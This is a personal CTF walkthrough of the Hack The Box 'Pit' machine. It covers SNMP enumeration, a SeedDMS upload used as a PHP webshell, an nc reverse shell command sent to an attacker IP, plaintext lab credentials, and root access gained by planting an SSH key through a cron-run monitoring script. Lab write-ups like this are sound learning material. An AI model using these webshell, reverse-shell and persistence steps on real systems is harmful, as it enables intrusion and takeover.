PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
* no vuln found

80/tcp   open  http            syn-ack ttl 63 nginx 1.14.1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.1
|_http-title: 403 Forbidden

* web enum to follow

9090/tcp open  ssl/zeus-admin? syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US/organizationalUnitName=ca-5763051739999573755

* web enum to follow

https://10.10.10.241:9090/
http://dms-pit.htb/ 403
pit.htb


dms-pit.htb


zeus-admin
* found xss, not useful


> dirsearch -u http://pit.htb -e php,html,txt -f

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, html, txt | HTTP method: get | Threads: 10 | Wordlist size: 20219

Error Log: /usr/share/sniper/plugins/dirsearch/logs/errors-21-07-27_09-49-31.log

Target: http://pit.htb

[09:49:32] Starting: 
[09:49:32] 400 -  173B  - /%2e%2e/google.com.php
[09:49:32] 400 -  173B  - /%2e%2e/google.com/
[09:49:32] 400 -  173B  - /%2e%2e/google.com.html
[09:49:32] 400 -  173B  - /%2e%2e/google.com.txt
[09:49:46] 200 -    4KB - /404.html
[09:50:46] 200 -    4KB - /index.html

Task Completed


> wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u "https://pit.htb:9090/FUZZ" --hl 776,50
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://pit.htb:9090/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000001575:   200        6 L      31 W       779 Ch      "favicon.ico"                                                                               
000002973:   200        0 L      4 W        24 Ch       "ping"                                                                                      

Total time: 0
Processed Requests: 4614
Filtered Requests: 4612
Requests/sec.: 0


https://pit.htb:9090/ping

> nmap -sU 10.10.10.241 -v
PORT    STATE         SERVICE
161/udp open|filtered snmp

> snmp-check 10.10.10.241
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.241:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.10.241
  Hostname                      : pit.htb
  Description                   : Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmp.local.conf)
  Location                      : Unknown (edit /etc/snmp/snmpd.conf)
  Uptime snmp                   : 18:42:21.87
  Uptime system                 : 18:41:41.36
  System date                   : -

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              systemd               /usr/lib/systemd/systemd  --switched-root --system --deserialize 18
  2                     runnable              kthreadd                                                        
  3                     unknown               rcu_gp                                                          
  4                     unknown               rcu_par_gp                                                      
  6                     unknown               kworker/0:0H-kblockd                                            
  9                     unknown               mm_percpu_wq                                                    
  10                    runnable              ksoftirqd/0                                                     
  11                    unknown               rcu_sched                                                       
  12                    runnable              migration/0                                                     
  13                    runnable              watchdog/0                                                      
  14                    runnable              cpuhp/0                                                         
  15                    runnable              cpuhp/1                                                         
  16                    runnable              watchdog/1                                                      
  17                    runnable              migration/1                                                     
  18                    runnable              ksoftirqd/1                                                     
  20                    unknown               kworker/1:0H                                                    
  23                    runnable              kdevtmpfs                                                       
  24                    unknown               netns                                                           
  25                    runnable              kauditd                                                         
  26                    runnable              khungtaskd                                                      
  27                    runnable              oom_reaper                                                      
  28                    unknown               writeback                                                       
  29                    runnable              kcompactd0                                                      
  30                    runnable              ksmd                                                            
  31                    runnable              khugepaged                                                      
  32                    unknown               crypto                                                          
  33                    unknown               kintegrityd                                                     
  34                    unknown               kblockd                                                         
  35                    unknown               blkcg_punt_bio                                                  
  36                    unknown               tpm_dev_wq                                                      
  37                    unknown               md                                                              
  38                    unknown               edac-poller                                                     
  39                    runnable              watchdogd                                                       
  40                    unknown               pm_wq                                                           
  62                    runnable              kswapd0                                                         
  155                   unknown               kthrotld                                                        
  156                   runnable              irq/24-pciehp                                                   
  157                   runnable              irq/25-pciehp                                                   
  158                   runnable              irq/26-pciehp                                                   
  159                   runnable              irq/27-pciehp                                                   
  160                   runnable              irq/28-pciehp                                                   
  161                   runnable              irq/29-pciehp                                                   
  162                   runnable              irq/30-pciehp                                                   
  163                   runnable              irq/31-pciehp                                                   
  164                   runnable              irq/32-pciehp                                                   
  165                   runnable              irq/33-pciehp                                                   
  166                   runnable              irq/34-pciehp                                                   
  167                   runnable              irq/35-pciehp                                                   
  168                   runnable              irq/36-pciehp                                                   
  169                   runnable              irq/37-pciehp                                                   
  170                   runnable              irq/38-pciehp                                                   
  171                   runnable              irq/39-pciehp                                                   
  172                   runnable              irq/40-pciehp                                                   
  173                   runnable              irq/41-pciehp                                                   
  174                   runnable              irq/42-pciehp                                                   
  175                   runnable              irq/43-pciehp                                                   
  176                   runnable              irq/44-pciehp                                                   
  177                   runnable              irq/45-pciehp                                                   
  178                   runnable              irq/46-pciehp                                                   
  179                   runnable              irq/47-pciehp                                                   
  180                   runnable              irq/48-pciehp                                                   
  181                   runnable              irq/49-pciehp                                                   
  182                   runnable              irq/50-pciehp                                                   
  183                   runnable              irq/51-pciehp                                                   
  184                   runnable              irq/52-pciehp                                                   
  185                   runnable              irq/53-pciehp                                                   
  186                   runnable              irq/54-pciehp                                                   
  187                   runnable              irq/55-pciehp                                                   
  188                   unknown               acpi_thermal_pm                                                 
  189                   unknown               kmpath_rdacd                                                    
  190                   unknown               kaluad                                                          
  192                   unknown               ipv6_addrconf                                                   
  193                   unknown               kstrp                                                           
  510                   unknown               mpt_poll_0                                                      
  511                   unknown               mpt/0                                                           
  513                   runnable              scsi_eh_0                                                       
  514                   unknown               scsi_tmf_0                                                      
  521                   unknown               ata_sff                                                         
  522                   runnable              scsi_eh_1                                                       
  524                   unknown               scsi_tmf_1                                                      
  525                   runnable              scsi_eh_2                                                       
  526                   unknown               scsi_tmf_2                                                      
  528                   runnable              scsi_eh_3                                                       
  529                   unknown               scsi_tmf_3                                                      
  530                   runnable              scsi_eh_4                                                       
  531                   unknown               scsi_tmf_4                                                      
  532                   runnable              scsi_eh_5                                                       
  533                   unknown               scsi_tmf_5                                                      
  534                   runnable              scsi_eh_6                                                       
  535                   unknown               scsi_tmf_6                                                      
  536                   runnable              scsi_eh_7                                                       
  537                   unknown               scsi_tmf_7                                                      
  538                   runnable              scsi_eh_8                                                       
  539                   unknown               scsi_tmf_8                                                      
  540                   runnable              scsi_eh_9                                                       
  541                   unknown               scsi_tmf_9                                                      
  542                   runnable              scsi_eh_10                                                      
  543                   unknown               scsi_tmf_10                                                     
  544                   runnable              scsi_eh_11                                                      
  545                   unknown               scsi_tmf_11                                                     
  546                   runnable              scsi_eh_12                                                      
  547                   unknown               scsi_tmf_12                                                     
  548                   runnable              scsi_eh_13                                                      
  549                   unknown               scsi_tmf_13                                                     
  550                   runnable              scsi_eh_14                                                      
  551                   unknown               scsi_tmf_14                                                     
  552                   runnable              scsi_eh_15                                                      
  553                   unknown               scsi_tmf_15                                                     
  554                   runnable              scsi_eh_16                                                      
  555                   unknown               scsi_tmf_16                                                     
  556                   runnable              scsi_eh_17                                                      
  557                   unknown               scsi_tmf_17                                                     
  558                   runnable              scsi_eh_18                                                      
  559                   unknown               scsi_tmf_18                                                     
  560                   runnable              scsi_eh_19                                                      
  561                   unknown               scsi_tmf_19                                                     
  562                   runnable              scsi_eh_20                                                      
  563                   unknown               scsi_tmf_20                                                     
  564                   runnable              scsi_eh_21                                                      
  565                   unknown               scsi_tmf_21                                                     
  566                   runnable              scsi_eh_22                                                      
  567                   unknown               scsi_tmf_22                                                     
  568                   runnable              scsi_eh_23                                                      
  569                   unknown               scsi_tmf_23                                                     
  570                   runnable              scsi_eh_24                                                      
  571                   unknown               scsi_tmf_24                                                     
  572                   runnable              scsi_eh_25                                                      
  573                   unknown               scsi_tmf_25                                                     
  574                   runnable              scsi_eh_26                                                      
  575                   unknown               scsi_tmf_26                                                     
  576                   runnable              scsi_eh_27                                                      
  577                   unknown               scsi_tmf_27                                                     
  578                   runnable              scsi_eh_28                                                      
  579                   unknown               scsi_tmf_28                                                     
  580                   runnable              scsi_eh_29                                                      
  581                   unknown               scsi_tmf_29                                                     
  582                   runnable              scsi_eh_30                                                      
  583                   unknown               scsi_tmf_30                                                     
  584                   runnable              scsi_eh_31                                                      
  585                   unknown               scsi_tmf_31                                                     
  586                   runnable              scsi_eh_32                                                      
  587                   unknown               scsi_tmf_32                                                     
  618                   runnable              irq/16-vmwgfx                                                   
  619                   unknown               ttm_swap                                                        
  626                   unknown               kworker/0:1H-kblockd                                            
  628                   unknown               kworker/1:1H-kblockd                                            
  681                   unknown               kdmflush                                                        
  691                   unknown               kdmflush                                                        
  723                   unknown               xfsalloc                                                        
  724                   unknown               xfs_mru_cache                                                   
  727                   unknown               xfs-buf/dm-0                                                    
  728                   unknown               xfs-conv/dm-0                                                   
  729                   unknown               xfs-cil/dm-0                                                    
  730                   unknown               xfs-reclaim/dm-                                                 
  731                   unknown               xfs-eofblocks/d                                                 
  732                   unknown               xfs-log/dm-0                                                    
  733                   runnable              xfsaild/dm-0                                                    
  831                   runnable              systemd-journal       /usr/lib/systemd/systemd-journald                      
  867                   runnable              systemd-udevd         /usr/lib/systemd/systemd-udevd                      
  929                   unknown               kdmflush                                                        
  940                   unknown               xfs-buf/dm-2                                                    
  941                   unknown               xfs-conv/dm-2                                                   
  942                   unknown               xfs-cil/dm-2                                                    
  943                   unknown               xfs-reclaim/dm-                                                 
  944                   unknown               xfs-eofblocks/d                                                 
  945                   unknown               xfs-log/dm-2                                                    
  946                   runnable              xfsaild/dm-2                                                    
  950                   runnable              jbd2/sda1-8                                                     
  954                   unknown               ext4-rsv-conver                                                 
  979                   runnable              auditd                /sbin/auditd                              
  981                   runnable              sedispatch            /usr/sbin/sedispatch                      
  1013                  runnable              polkitd               /usr/lib/polkit-1/polkitd  --no-debug          
  1015                  runnable              irqbalance            /usr/sbin/irqbalance  --foreground        
  1017                  runnable              sssd                  /usr/sbin/sssd        -i --logger=files   
  1018                  runnable              VGAuthService         /usr/bin/VGAuthService  -s                  
  1019                  runnable              vmtoolsd              /usr/bin/vmtoolsd                         
  1020                  runnable              dbus-daemon           /usr/bin/dbus-daemon  --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  1023                  runnable              chronyd               /usr/sbin/chronyd                         
  1033                  runnable              rngd                  /sbin/rngd            -f --fill-watermark=0
  1051                  runnable              sssd_be               /usr/libexec/sssd/sssd_be  --domain implicit_files --uid 0 --gid 0 --logger=files
  1055                  runnable              firewalld             /usr/libexec/platform-python  -s /usr/sbin/firewalld --nofork --nopid
  1061                  runnable              sssd_nss              /usr/libexec/sssd/sssd_nss  --uid 0 --gid 0 --logger=files
  1093                  runnable              systemd-logind        /usr/lib/systemd/systemd-logind                      
  1095                  runnable              NetworkManager        /usr/sbin/NetworkManager  --no-daemon         
  1117                  runnable              sshd                  /usr/sbin/sshd        -D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128
  1122                  runnable              tuned                 /usr/libexec/platform-python  -Es /usr/sbin/tuned -l -P
  1139                  runnable              crond                 /usr/sbin/crond       -n                  
  1152                  runnable              agetty                /sbin/agetty          -o -p -- \u --noclear tty1 linux
  1208                  runnable              mysqld                /usr/libexec/mysqld   --basedir=/usr      
  1219                  runnable              nginx                 nginx: master process /usr/sbin/nginx                      
  1220                  runnable              nginx                 nginx: worker process                      
  1221                  runnable              nginx                 nginx: worker process                      
  1502                  running               snmpd                 /usr/sbin/snmpd       -LS0-6d -f          
  1503                  runnable              rsyslogd              /usr/sbin/rsyslogd    -n                  
  10942                 unknown               kworker/u4:1-xfs-cil/dm-0                                            
  10945                 unknown               kworker/0:1-events                                              
  11169                 unknown               kworker/1:0-cgroup_destroy                                            
  11249                 unknown               kworker/1:2-events                                              
  11455                 unknown               kworker/u4:2-events_unbound                                            
  11640                 unknown               kworker/0:5-events                                              
  11838                 unknown               kworker/0:0-events                                              
  11843                 unknown               kworker/1:1-mpt_poll_0                                            
  11846                 unknown               kworker/1:4-cgroup_pidlist_destroy                                            
  11925                 runnable              php-fpm               php-fpm: master process (/etc/php-fpm.conf)                      
  11926                 runnable              php-fpm               php-fpm: pool www                         
  11927                 runnable              php-fpm               php-fpm: pool www                         
  11928                 runnable              php-fpm               php-fpm: pool www                         
  11929                 runnable              php-fpm               php-fpm: pool www                         
  11930                 runnable              php-fpm               php-fpm: pool www                         
  11939                 unknown               kworker/0:2-events_power_efficient 


> snmpwalk -v 2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       393Mi       3.2Gi        16Mi       279Mi       3.2Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 19:17:59 up 18:44,  0 users,  load average: 0.11, 0.36, 0.53

> snmpwalk -v 2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
found `michelle`


* https://www.getkandg.com/2021/05/pit-hack-box-writeup-pit-machine.html
.1.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
> http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F
* and use the user found michelle

http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=21&showtree=1
Dear colleagues, Because of security issues in the previously installed version (5.1.10), I upgraded SeedDMS to version 5.1.15. See the attached CHANGELOG file for more information. If you find any issues, please report them immediately to admin@dms-pit.htb.

`SeedDMS` 5.1.15
`admin@dms-pit.htb`

* http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewFolder.php?folderid=9&showtree=1
found `Jack`

* update doc as a backdoor
* http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=ls

curl "http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=nc+10.10.x.x+443+-e+bash"

* http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=cat%20../../conf/settings.xml

<database dbdriver="sqlite" dbhostname="localhost" dbdatabase="/home/www-data/seeddms51x/data/content.db" dbuser="seeddms" dbpass="seeddms" donotcheckversion="false">


* login to https://pit.htb:9090/
`michelle:ied^ieY6xoquu`

there are too many unnecessary tricks in htb vms overall, not technically realistic

# user.txt

# pe
[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/home/michelle/.local/bin:/home/michelle/bin:/home/michelle/.local/bin:/home/michelle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /home/michelle/.local/bin:/home/michelle/bin:/home/michelle/.local/bin:/home/michelle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Files with capabilities (limited to 50):
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p

/home/michelle/.lesshst
/home/michelle/.bash_history


> cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done

[michelle@pit ~]$ echo $PATH
/home/michelle/.local/bin:/home/michelle/bin:/home/michelle/.local/bin:/home/michelle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
[michelle@pit ~]$ ls /etc/sudo
sudo.conf       sudoers         sudoers.d/      sudo-ldap.conf  
[michelle@pit ~]$ ls /etc/sudo
sudo.conf       sudoers         sudoers.d/      sudo-ldap.conf  
[michelle@pit ~]$ ls /etc/sudoers.d/
ls: cannot open directory '/etc/sudoers.d/': Permission denied
[michelle@pit ~]$ echo "michelle  ALL=(ALL:ALL) NOPASSWD:ALL" > /tmp/michelle
[michelle@pit ~]$ cat /tmp/michelle 
michelle  ALL=(ALL:ALL) NOPASSWD:ALL

> echo "echo 'id_rsa.pub' >> ~/.ssh/authorized_keys" > /usr/local/monitoring/check.sh

> snmpwalk -v 2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects

> ssh -i ~/.ssh/id_rsa root@10.10.10.241
Web console: https://pit.htb:9090/

Last failed login: Mon Jul 26 21:32:18 EDT 2021 on pts/0
There were 3 failed login attempts since the last successful login.
Last login: Mon Jul 26 06:58:15 2021
[root@pit ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@pit ~]# ls -ls
total 8
4 -rwx------. 1 root root 706 Apr 22  2020 cleanup.sh
0 drwx------. 2 root root 122 Apr 18  2020 monitoring
0 lrwxrwxrwx. 1 root root   9 May 10 11:07 null -> /dev/null
4 -r--------. 1 root root  33 Jul 26 21:15 root.txt
[root@pit ~]# cat root.txt 
ad76374ceba05aa03e76523fb7577532
[root@pit ~]#

# root.txt


# reflection
* stuck on enumeration and fall into rabbit hole on web
* later found walkthrough regarding udp enum, so, when stuck, at least run a default udp scan
* then using snmpwalk and extended modules, found username michelle, but didn't pay attention to `montoring`
* from the snmp result, found path to /var/www/html, which reveals more dirs
* then login to the portal through weak password
* then create a simple webshell by uploading a doc through known vuln, shouldn't be fooled by the notes about update
* from the webshell, i tried to get reverse shell but didn't succeed, eventually found a folder with config and passwords in it
* when try to login using the password, i didn't try all found usernames
* when doing enum, i only replied on linpeas, but didn't pay attention to info i had beforehand
